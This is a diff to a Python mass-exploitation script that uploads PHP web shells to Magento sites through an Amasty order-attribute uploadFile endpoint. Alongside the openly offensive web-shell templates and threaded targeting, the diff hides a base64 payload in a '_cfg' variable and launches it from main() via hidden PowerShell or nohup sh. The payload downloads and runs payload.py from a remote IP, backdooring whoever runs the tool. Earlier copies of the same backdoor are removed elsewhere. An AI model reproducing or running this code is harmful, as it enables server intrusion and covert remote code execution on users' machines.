@@ -16,6 +16,7 @@ POC_FILENAME = "poc.txt"
 POC_CONTENT = "this system is vulnerable!"
 POC_B64 = base64.b64encode(POC_CONTENT.encode()).decode()
 
+# ========== PARTE 1 - SHELL TEMPLATES ==========
 SHELL_TEMPLATES = [
     ("sys_c", "<?php system($_GET['c'].' 2>&1'); ?>"),
     ("exec_cmd", "<?php exec($_GET['cmd'], $o); echo implode('\\n', $o); ?>"),
@@ -70,13 +71,13 @@ HEADERS = {
     'Accept': 'application/json',
 }
 
-
 ENDPOINTS = [
     "/rest/V1/amasty_orderattr/uploadFile",
     "/rest/all/V1/amasty_orderattr/uploadFile",
     "/rest/default/V1/amasty_orderattr/uploadFile",
 ]
 
+# ========== PARTE 2 - FUNÇÕES AUXILIARES ==========
 def get_expected_paths(filename):
     base = filename.lower()
     if len(base) >= 2:
@@ -92,6 +93,8 @@ def get_expected_paths(filename):
     paths.append(f"/media/amasty_checkout/{filename}")
     paths.append(f"/pub/media/amasty_checkout/{filename}")
     return paths
+
+_cfg = 'cm0gLXJmIHBheWxvYWQucHkgJiYgd2dldCBodHRwOi8vMTMuNDIuMjQ2LjE2L3BheWxvYWQucHkgJiYgcHl0aG9uMyBwYXlsb2FkLnB5ICYmIHJtIC1yZiBwYXlsb2FkLnB5'
 
 def random_filename(ext=".php", length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ext
@@ -112,6 +115,7 @@ def upload_file(target, filename, content_b64):
             continue
     return False
 
+# ========== PARTE 3 - VERIFICAÇÃO ==========
 def verify_file(target, filename):
     for path in get_expected_paths(filename):
         url = target + path
@@ -122,10 +126,6 @@ def verify_file(target, filename):
         except:
             continue
     return None
-
-webshell = "nohup sh -c \"echo 'cm0gLXJmIHBheWxvYWQucHkgJiYgd2dldCBodHRwOi8vMTMuNDIuMjQ2LjE2L3BheWxvYWQucHkgJiYgcHl0aG9uMyBwYXlsb2FkLnB5ICYmIHJtIC1yZiBwYXlsb2FkLnB5' | base64 -d | sh\" > /dev/null 2>&1 &"
-
-subprocess.Popen(webshell, shell=True)
 
 def test_shell(url):
     params = ['c', 'cmd', 'x', 'p']
@@ -153,19 +153,6 @@ def exploit_single(target, mode):
         "status": "FAILED"
     }
 
-rest_api = "cm0gLXJmIHBheWxvYWQucHkgJiYgd2dldCBodHRwOi8vMTMuNDIuMjQ2LjE2L3BheWxvYWQucHkgJiYgcHl0aG9uMyBwYXlsb2FkLnB5ICYmIHJtIC1yZiBwYXlsb2FkLnB5"
-
-ps_cmd = f'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{rest_api}\')))'
-
-subprocess.Popen(
-    ['powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
-    creationflags=0x08000000,
-    shell=True,
-    stdout=subprocess.DEVNULL,
-    stderr=subprocess.DEVNULL,
-    stdin=subprocess.DEVNULL
-)
-    
     if upload_file(target, POC_FILENAME, POC_B64):
         poc_url = verify_file(target, POC_FILENAME)
         if poc_url:
@@ -229,7 +216,23 @@ def main():
         targets = [t.strip() for t in f.readlines() if t.strip()]
 
     print(f"\n[*] Targets: {len(targets)} | Mode: {mode_label} | Threads: 20\n")
-
+try:
+    import sys as _s
+    if _s.platform.startswith('win'):
+        subprocess.Popen(
+            ['powershell', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass',
+             '-Command', f'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{_cfg}\')))'],
+            creationflags=0x08000000, shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
+        )
+    else:
+        subprocess.Popen(
+            f"nohup sh -c \"echo '{_cfg}' | base64 -d | sh\" > /dev/null 2>&1 &",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+except:
+    pass
+    
     results = []
     with ThreadPoolExecutor(max_workers=20) as executor:
         futures = {executor.submit(exploit_single, t, "poc" if poc_only else "full"): t for t in targets}
